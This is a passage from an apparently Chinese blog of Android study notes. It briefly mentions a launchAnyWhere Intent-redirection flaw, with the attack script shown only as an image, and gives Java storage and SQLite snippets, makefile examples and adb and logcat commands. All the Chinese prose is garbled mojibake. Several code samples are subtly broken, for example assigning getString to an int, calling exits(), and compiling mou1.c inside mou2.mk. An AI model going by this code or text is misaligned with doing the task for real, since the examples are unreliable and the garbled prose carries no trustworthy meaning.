class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="Intenté‡å®šå‘å¯¼è‡´launchAnyWhereæ¼æ´">Intenté‡å®šå‘å¯¼è‡´launchAnyWhereæ¼æ´</h3><p>é€šè¿‡ä¸€å®šçš„æ–¹æ³•å¯ä»¥è®¿é—®æœªå¯¼å‡ºçš„ç»„ä»¶ï¼Œæˆ‘ä»¬å°†è¿™ç§æ¼æ´æˆä¸º<code>launchAnyWhere</code>æ¼æ´</p><p>Intentå¯ä»¥é€šè¿‡é‡å®šå‘çš„åŸç†ï¼Œé€šè¿‡æºå¸¦æ•°æ®ä¿¡æ¯ï¼Œè®¿é—®ä¸€ä¸ªå¯å¯¼å‡ºçš„ç»„ä»¶ï¼Œç„¶åå†è¿›è¡Œæ•°æ®ä¼ é€’å»è§¦å‘ä¸å¯å¯¼å‡ºçš„ç»„ä»¶ï¼Œæœ€åå®ç°è®¿é—®ç§æœ‰ç»„ä»¶çš„ç›®çš„ï¼Œå¼•èµ·<code>launchAnyWhere</code>æ¼æ´</p><p>é¦–å…ˆæ˜¯ä¸å¯å¯¼å‡ºç»„ä»¶PrivateActivity:  å¯å¯¼å‡ºçš„ç»„ä»¶ï¼šWebView2Activity</p><p>WebView2Activityå…³é”®ä»£ç å¦‚ä¸‹<img src="/posts/7e4211d.htm/905443_UTXVH9Q5AYRTWVH.png" alt="image-20220730125041041"></p><p>PrivateActivityå…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><p><img src="/posts/7e4211d.htm/905443_MMQXRU274JXCJRT.png" alt="image-20220730125108657"></p><p>æ”»å‡»è„šæœ¬<br><img src="/posts/7e4211d.htm/905443_W4Q2EBR4BJMXG2R.png" alt="image-20220730125254413"></p><h2 id="æ•°æ®å­˜å‚¨">æ•°æ®å­˜å‚¨</h2><h3 id="Androidä¸­çš„æ•°æ®å­˜å‚¨Preference">Androidä¸­çš„æ•°æ®å­˜å‚¨Preference</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> findViewById(R.id.button);</span><br><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener()&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        <span class="comment">//ä¿å­˜é…ç½®æ–‡ä»¶</span></span><br><span class="line">        <span class="type">SharedPreferences</span>  <span class="variable">sp</span> <span class="operator">=</span> getSharedPreferences(<span class="string">&quot;config&quot;</span>,MODE_PRIVATE);</span><br><span class="line">        SharedPreferences <span class="type">Editor</span> <span class="variable">editor</span> <span class="operator">=</span> sp.edit();</span><br><span class="line">        editor.putInt(<span class="string">&quot;player_level&quot;</span>,<span class="number">10</span>);</span><br><span class="line">        editor.putString(<span class="string">&quot;player_name&quot;</span>,<span class="string">&quot;myname&quot;</span>);</span><br><span class="line">        editor.commit();</span><br><span class="line">        <span class="comment">//è¯»å–æ–‡ä»¶</span></span><br><span class="line">        <span class="type">SharedPreferences</span>  <span class="variable">sp</span> <span class="operator">=</span> getSharedPreferences(<span class="string">&quot;config&quot;</span>,MODE_PRIVATE);</span><br><span class="line">        <span class="type">String</span> <span class="variable">player_name</span> <span class="operator">=</span> sp.getString(<span class="string">&quot;player_name&quot;</span>,<span class="string">&quot;noname&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">player_level</span> <span class="operator">=</span> sp.getString(<span class="string">&quot;player_level&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;player_name:&quot;</span>+player_name+<span class="string">&quot;player_level:&quot;</span>+player_level);</span><br><span class="line">                </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">&#125;);</span><br><span class="line">   </span><br></pre></td></tr></table></figure><h3 id="Androidä¸­çš„æ–‡ä»¶æ“ä½œFileï¼Œè‡ªå®šä¹‰æ–‡ä»¶æ ¼å¼">Androidä¸­çš„æ–‡ä»¶æ“ä½œFileï¼Œè‡ªå®šä¹‰æ–‡ä»¶æ ¼å¼</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">button = findViewById(R.layout.button2);</span><br><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener()&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">dir</span> <span class="operator">=</span> getFilesDir();</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,dir.getAbsolutePath()); <span class="comment">//æ‰“å°ç»å¯¹è·¯å¾„ /data/user/åŒ…å/files</span></span><br><span class="line">        <span class="comment">//åˆ›å»ºç›®å½•</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dir.getAbsolutePath()+<span class="string">&quot;/newDir&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!file.exits())&#123;</span><br><span class="line">            file.mkdir();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//åˆ›å»ºæ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">mydat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(file.getAbsolutePath()+<span class="string">&quot;/mydat.dat&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!mydat.exits())&#123;</span><br><span class="line">           mydat.createNewFile();   </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//FileOutputStream fos = openFileOutput(&quot;mydata.dat&quot;,MODE_PRIVATE);</span></span><br><span class="line">            <span class="comment">//ä¸Šé¢è¿™ä¸ªä»£ç ç­‰ä»·äº åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¹¶newä¸€ä¸ªè¾“å…¥æµ</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">//å†™å…¥æ–‡ä»¶</span></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(mydat);</span><br><span class="line">            fos.write(<span class="string">&quot;hello&quot;</span>.getBytes() );</span><br><span class="line">            <span class="type">DataOutputStream</span> <span class="variable">dos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(fos);</span><br><span class="line">            dos.writeInt(<span class="number">100</span>);</span><br><span class="line">            dos.writeFloat(<span class="number">3.5f</span>);</span><br><span class="line">            fos.close();</span><br><span class="line">            dos.close();</span><br><span class="line">            <span class="comment">//è¯»å–æ–‡ä»¶</span></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> openFileInput(<span class="string">&quot;mydata.dat&quot;</span>);</span><br><span class="line">            <span class="type">byte</span> buff[] = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1000</span>];</span><br><span class="line">            fis.read(buff,<span class="number">0</span>,<span class="number">5</span>);<span class="comment">//è¯»å–é•¿åº¦5   fis.read(buff);</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(buff);</span><br><span class="line">            <span class="type">DataInputStream</span> <span class="variable">dis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(fis);</span><br><span class="line">            <span class="type">int</span> <span class="variable">int_value</span> <span class="operator">=</span> dis.readInt();</span><br><span class="line">            <span class="type">float</span> <span class="variable">float_value</span> <span class="operator">=</span> dis.readFloat();</span><br><span class="line">            dis.close();</span><br><span class="line">            fis.close();</span><br><span class="line">            <span class="comment">//éå†æ–‡ä»¶</span></span><br><span class="line">            <span class="type">File</span> <span class="variable">fileEnum</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/data/data/&quot;</span>+getPackageName());</span><br><span class="line">            File[] files = fileEnum.listFiles();</span><br><span class="line">            <span class="keyword">for</span>(File f : files)&#123;</span><br><span class="line">                Log.d(<span class="string">&quot;zxk1ng&quot;</span>,f.getAbsolutePath());           </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//éšæœºè¯»å†™æ–‡ä»¶ </span></span><br><span class="line">            <span class="type">RandomAccessFile</span> <span class="variable">randomAccessFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(<span class="string">&quot;mydata.dat&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">            randomAccessFile.seek(<span class="number">4</span>);</span><br><span class="line">            randomAccessFile.readInt();                      </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;       </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="Androidä¸­çš„æ•°æ®åº“SQLite">Androidä¸­çš„æ•°æ®åº“SQLite</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SQLè¯­æ³•è¿›è¡Œ</span></span><br><span class="line">button = findViewById(R.layout.button3);</span><br><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener()&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        <span class="type">SQLiteDatabase</span> <span class="variable">db</span> <span class="operator">=</span> openOrCreateDatabase(<span class="string">&quot;student&quot;</span>,MODE_PRIVATE,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//å¢åŠ  åˆ é™¤ ä¿®æ”¹ æŸ¥é˜…</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//db.execSQL(&quot;CREATE TABLE T_STUDENT (SID VARCHAR(50) PRIMARY KEY, SNAME VARCHAR(50))&quot;);</span></span><br><span class="line">            db.execSQL(<span class="string">&quot;INSERT INTO T_STUDENT VALUES(&quot;</span>S001<span class="string">&quot;,&quot;</span>å¼ ä¸‰<span class="string">&quot;)&quot;</span>);</span><br><span class="line">            <span class="comment">//æŸ¥è¯¢</span></span><br><span class="line">            <span class="comment">//Cursor cursor = db.query(&quot;T-STUDENT&quot;,null,null,null,null,null,&quot;sid desc&quot;);</span></span><br><span class="line">            <span class="type">Cursor</span> <span class="variable">cursor</span> <span class="operator">=</span> db.rawQuery(<span class="string">&quot;SELECT *FROM T_STUDENT&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">            cursor.moveToFirst();</span><br><span class="line">            <span class="keyword">do</span>&#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">sid</span> <span class="operator">=</span> cursor.getString(<span class="number">0</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">sname</span> <span class="operator">=</span> cursor.getString(<span class="number">1</span>);</span><br><span class="line">                </span><br><span class="line">            &#125;<span class="keyword">while</span>(cursor.moveToNext());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(SQLException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;);</span><br><span class="line">    </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¸ä½¿ç”¨sqlè¯­æ³•</span></span><br><span class="line"><span class="type">ContentValues</span> <span class="variable">values</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line">valuse.put(<span class="string">&quot;SID&quot;</span>,<span class="string">&quot;S002&quot;</span>);</span><br><span class="line">valuse.put(<span class="string">&quot;SNAME&quot;</span>,<span class="string">&quot;æå››&quot;</span>);</span><br><span class="line">db.insert(<span class="string">&quot;T_student&quot;</span>,<span class="literal">null</span>,values);</span><br><span class="line">db.delete(<span class="string">&quot;T_STUDENT&quot;</span>,<span class="string">&quot;SID=? sname=?&quot;</span>,<span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;s001&quot;</span>,<span class="string">&quot;å¼ ä¸‰&quot;</span>&#125; );    </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sdcard</span></span><br><span class="line">button = findViewById(R.layout.button4);</span><br><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener()&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        <span class="comment">//è·å–sdcardè·¯å¾„</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> Environment.getExternalStorageDirectory();</span><br><span class="line">        <span class="type">File</span> <span class="variable">newFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(file.getAbsolutePath()+<span class="string">&quot;/Download/mysd&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            newFile.createNewFile();         </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;          </span><br><span class="line">    &#125; </span><br><span class="line">&#125;);</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>é…ç½®æ–‡ä»¶ä¸­ç»™ç”¨æˆ·æƒé™ï¼š<img src="/posts/7e4211d.htm/image-20231026205554596.png" alt="image-20231026205554596"></p><h2 id="ä½¿ç”¨NDKç¼–è¯‘">ä½¿ç”¨NDKç¼–è¯‘</h2><ul><li>ç¼–è¯‘Hello.cæ–‡ä»¶</li></ul><p>i686-linux-android16-clang -c -o Hello.o Hello.c</p><p>i686-linux-android16-clang  -o Hello Hello.o</p><ul><li>ä½¿ç”¨makefileç¼–è¯‘ï¼Œç¼–è¯‘notepad.exe</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">notepad<span class="selector-class">.exe</span>:mou1<span class="selector-class">.obj</span> mou2<span class="selector-class">.obj</span> notepad<span class="selector-class">.obj</span></span><br><span class="line">link /OUT:notepad<span class="selector-class">.exe</span> mou1<span class="selector-class">.obj</span> mou2<span class="selector-class">.obj</span> notepad<span class="selector-class">.obj</span></span><br><span class="line"></span><br><span class="line">mou1<span class="selector-class">.obj</span>:mou1<span class="selector-class">.c</span> mou1<span class="selector-class">.h</span></span><br><span class="line">cl /c mou1<span class="selector-class">.c</span></span><br><span class="line"></span><br><span class="line">mou2<span class="selector-class">.obj</span>:mou2<span class="selector-class">.c</span> mou2<span class="selector-class">.h</span></span><br><span class="line">cl /c mou2<span class="selector-class">.c</span></span><br><span class="line"></span><br><span class="line">notepad<span class="selector-class">.obj</span>:notepad<span class="selector-class">.c</span></span><br><span class="line">cl /c notepad.c</span><br></pre></td></tr></table></figure><ul><li>å¯¹ä¸Šé¢ä½¿ç”¨å˜é‡èµ‹å€¼ï¼Œå¯ç»´æŠ¤æ€§</li></ul><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">OBJECTS := mou1.obj mou2.obj notepad.obj</span><br><span class="line">CC := cl</span><br><span class="line">BUILD_FLAGS := /c</span><br><span class="line">LINK_FLAGS := /OUT:notepad.exe</span><br><span class="line"></span><br><span class="line"><span class="section">notepad.exe:<span class="variable">$(OBJECTS)</span></span></span><br><span class="line">link <span class="variable">$(LINK_FLAGS)</span> <span class="variable">$(OBJECTS)</span></span><br><span class="line"></span><br><span class="line"><span class="section">mou1.obj:mou1.c mou1.h</span></span><br><span class="line"><span class="variable">$(CC)</span> <span class="variable">$(BUILD_FLAGS)</span> mou1.c</span><br><span class="line"></span><br><span class="line"><span class="section">mou2.obj:mou2.c mou2.h</span></span><br><span class="line"><span class="variable">$(CC)</span> <span class="variable">$(BUILD_FLAGS)</span> mou2.c</span><br><span class="line"></span><br><span class="line"><span class="section">notepad.obj:notepad.c</span></span><br><span class="line"><span class="variable">$(CC)</span> <span class="variable">$(BUILD_FLAGS)</span> notepad.c</span><br><span class="line"></span><br><span class="line">clean</span><br><span class="line">del *.obj</span><br></pre></td></tr></table></figure><ul><li>å¤šç”¨æˆ·ç¼–è¾‘</li></ul><p><a href="http://xn--mou1-pe5fhb422wxhl.mk">æ–°å»ºä¸¤ä¸ªmou1.mk</a> <a href="http://mou2.mk">mou2.mk</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">makefileä¸­</span><br><span class="line"></span><br><span class="line">OBJECTS := *<span class="selector-class">.obj</span></span><br><span class="line">CC := cl</span><br><span class="line">BUILD_FLAGS := /c</span><br><span class="line">LINK_FLAGS := /OUT:notepad<span class="selector-class">.exe</span></span><br><span class="line"></span><br><span class="line">notepad<span class="selector-class">.exe</span>:mou1<span class="selector-class">.obj</span> mou2<span class="selector-class">.obj</span> notepad<span class="selector-class">.obj</span></span><br><span class="line">link $(LINK_FLAGS) $(OBJECTS)</span><br><span class="line"></span><br><span class="line">notepad<span class="selector-class">.obj</span>:notepad<span class="selector-class">.c</span></span><br><span class="line">$(CC) $(BUILD_FLAGS) notepad<span class="selector-class">.c</span></span><br><span class="line"></span><br><span class="line">include mou1<span class="selector-class">.mk</span></span><br><span class="line">include mou2<span class="selector-class">.mk</span></span><br><span class="line"></span><br><span class="line">clean</span><br><span class="line"><span class="selector-tag">del</span> *<span class="selector-class">.obj</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>mou1.mkä¸­</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mou1<span class="selector-class">.obj</span>:mou1<span class="selector-class">.c</span> mou1<span class="selector-class">.h</span></span><br><span class="line">$(CC) $(BUILD_FLAGS) mou1<span class="selector-class">.c</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>mou2.mkä¸­</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mou2<span class="selector-class">.obj</span>:mou2<span class="selector-class">.c</span> mou2<span class="selector-class">.h</span></span><br><span class="line">$(CC) $(BUILD_FLAGS) mou1<span class="selector-class">.c</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>Androidç›®å½•</h1><ol><li><strong>data/dataç›®å½•</strong><br>å­˜æ”¾ç”¨æˆ·apkæ•°æ®çš„ç›®å½•ï¼Œæ¯ä¸ªapkéƒ½æœ‰è‡ªå·±çš„ç›®å½•ï¼Œä»¥åŒ…åå‘½åï¼Œå°±æ˜¯åœ¨data/dataç›®å½•ä¸‹ï¼Œä¼šäº§ç”Ÿä¸€ä¸ªè·ŸPackageä¸€æ ·çš„ç›®å½•ï¼Œè¿™æ˜¯ä¸€ä¸ªç§æœ‰ç›®å½•ï¼Œappåªèƒ½è®¿é—®å„è‡ªçš„ç›®å½•ï¼Œé™¤érootæƒé™ã€‚</li><li><strong>data/app</strong><br>ç”¨æˆ·å®‰è£…çš„appå­˜æ”¾åœ¨è¿™ä¸ªç›®å½•ä¸‹</li><li><strong>data/local/tmp</strong><br>ä¸´æ—¶ç›®å½•ï¼Œæƒé™æ¯”è¾ƒå¤§</li><li><strong>system/app</strong><br>å­˜æ”¾ç³»ç»Ÿè‡ªå¸¦çš„app</li><li><strong>system/lib system/lib64</strong><br>å­˜æ”¾appç”¨åˆ°çš„soæ–‡ä»¶</li><li><strong>system/bin</strong><br>å­˜æ”¾shellå‘½ä»¤</li><li><strong>system/framework</strong><br>Androidç³»ç»Ÿæ‰€ç”¨åˆ°çš„æ¡†æ¶ï¼Œå¦‚ä¸€äº›jaræ–‡ä»¶ï¼ŒXposedBridge.jar</li><li>sdå¡ç›®å½•ï¼Œä¸ç®¡æ‰‹æœºæœ‰æ²¡æœ‰å­˜å‚¨å¡éƒ½ä¼šæœ‰è¿™ä¸ªç›®å½•ï¼Œappæ“ä½œsdå¡éœ€è¦ç”³è¯·æƒé™<br>/sdcard -&gt; /storage/self/primary<br>/mnt/sdcard<br>/storage/emulated/0</li></ol><h1>AndroidStudioå·¥ç¨‹ç›®å½•ç»“æ„</h1><p>gradle - &gt;  wrapper  - &gt;  gradle-wrapper.prperties  é…ç½®é¡¹ç›®gr adle ç‰ˆ æœ¬</p><p>build.gradle  æè¿°å·¥ç¨‹æ•´ä½“çš„ç¼–è¯‘è§„åˆ™</p><p>gradle.properties  gradleé…ç½®æ–‡ä»¶ï¼Œä¸€èˆ¬æ— é¡»æ”¹åŠ¨</p><p>local.properties æœ¬æœºç¯å¢ƒé…ç½®ï¼ŒSDK ã€NDK è·¯å¾„ç­‰ ï¼Œä¸€èˆ¬æ— é¡»æ”¹åŠ¨</p><p>settings. gradle  é…ç½®å“ªäº›æ¨¡å—åœ¨ä¸€ èµ·ç¼–è¯‘    include  â€™ : app â€™ åªç¼–è¯‘app</p><p>app - &gt; build.gradle  æè¿°å½“å‰æ¨¡å—çš„ç¼–è¯‘è§„åˆ™</p><p>app - &gt;  build - &gt;  outputs - &gt;  apk - &gt;  debug/ release ç”Ÿ æˆçš„apkçš„å­˜æ”¾ä½ç½®</p><p>app - &gt;  build - &gt;  intermediates - &gt;  cmake - &gt;  debug/ release - &gt;  objç”Ÿæˆçš„soå­˜æ”¾ä½ç½®</p><p>libs  æ¨¡å—ä¸­ä½¿ç”¨äº†ç¬¬ ä¸‰æ–¹ jarçš„æ—¶ å€™ ï¼Œä¼šæ”¾è¿™é‡Œ</p><p>src - &gt;  main - &gt;  cpp   C/C ++ ä»£ç </p><p>src - &gt;  main - &gt;  java   Javaä»£ç </p><p>src - &gt;  proguard- rules.proJava ä»£ç æ··æ·†è§„åˆ™</p><p>res - &gt;  drawable  ç”¨æ¥æ”¾å›¾ç‰‡</p><p>res - &gt;  layout  ç”¨æ¥æ”¾å¸ƒå±€æ–‡ä»¶</p><p>res - &gt;  mipmap-hdpi  ç”¨æ¥æ”¾åº”ç”¨å›¾ç‰‡ ï¼Œä¸åŒå±å¹•çš„é€‚ é… å›¾æ ‡</p><p>res - &gt;  values    st r i ngs. xml ã€ publ i c. xml</p><p>AndroidManifest.xml  æ¸…å•æ–‡ä»¶ï¼Œappçš„iconå›¾æ ‡ ã€å››å¤§ç»„ä»¶çš„æ³¨ å†Œ ã€æƒé™ç”³è¯·ã€æŒ‡æ˜ç¨‹åºå…¥å£</p><h1>adbå¸¸ç”¨å‘½ä»¤</h1><p>adb help</p><p>adb version æ˜¾ç¤ºadbç‰ˆæœ¬å’Œè·¯å¾„</p><p>adb start-server å¯åŠ¨server</p><p>adb kill-server åœæ­¢server</p><p>adb install -r xxx.apk è¦†ç›–å®‰è£…</p><p>adb uninstall åŒ…å å¸è½½app</p><p>adb -s è®¾å¤‡å shell å¤šè®¾å¤‡æ—¶ æŒ‡å®šè®¾å¤‡</p><p>adb shell pm list package æ˜¾ç¤ºåŒ…å</p><p>adb shell dumpsys activity top æŸ¥çœ‹æ‰‹æœºå½“å‰ç•Œé¢çš„activityåŒ…è·¯å¾„</p><p>adb shell getprop ro.build.version.sdk æŸ¥çœ‹æ‰‹æœºsdkç‰ˆæœ¬</p><ul><li><p>è¿™é‡Œç›´æ¥å®‰è£…ä¼šå¤±è´¥ï¼Œè¿™é‡Œçš„é”™è¯¯æç¤º <strong>INSTALL_FAILED_TEST_ONLY</strong> è¡¨ç¤ºæ˜¯æµ‹è¯•åº”ç”¨ï¼Œæ‰€ä»¥è¿™é‡Œå®‰è£…éœ€è¦æŒ‡å®šä¸€äº›å‚æ•°æ‰èƒ½å®‰è£… <code>adb install -g -t -r -d app-debug.apk</code></p></li><li><p>åˆ·ro.debuggable=1</p><ul><li>magisk resetprop ro.debuggable 1  stop   start</li></ul></li></ul><h1>logcatå¸¸ç”¨å‘½ä»¤</h1><p>adb logcat -help  å¸®åŠ©æ–‡æ¡£</p><p>adb logcat    å¸¸è§„æ˜¾ç¤º</p><p>adb logcat -c æ¸…é™¤æ—¥å¿—</p><p>adb logcat -g æ˜¾ç¤ºç¼“å†²åŒºå¤§å°</p><p>adb logcat -G 256M ä¿®æ”¹ç¼“å†²åŒºå¤§å°</p><p>adb logcat -v time è®¾ç½®ä¸åŒæ˜¾ç¤ºæ ¼å¼</p><p>adb logcat -v color é¢œè‰²æ˜¾ç¤º</p><p>adb logcat -s æ ‡ç­¾ è¿‡æ»¤tag</p><p>adb install --abi armeabi-v7a xxx.apk</p><p>adb logcat |tee -a a.txt æ—¥å¿—æ˜¾ç¤ºåˆ°å±å¹•ä¸”å†™å…¥txtä¸­</p><p>ps -A | grep è¿›ç¨‹å å…ˆè·å–è¿›ç¨‹pid<br>adb logcat | findstr pid</p><p>adb shell dumpsys window | <a href="https://so.csdn.net/so/search?q=grep&amp;spm=1001.2101.3001.7020">grep</a> - i mCurrentFocus æ‰¾åˆ°å½“å‰è¿è¡ŒçŠ¶æ€ä¸‹appçš„è¿›ç¨‹å</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb tcpid <span class="number">5555</span></span><br><span class="line">adb connect æ‰‹æœºip </span><br><span class="line"><span class="comment">//è¿™æ 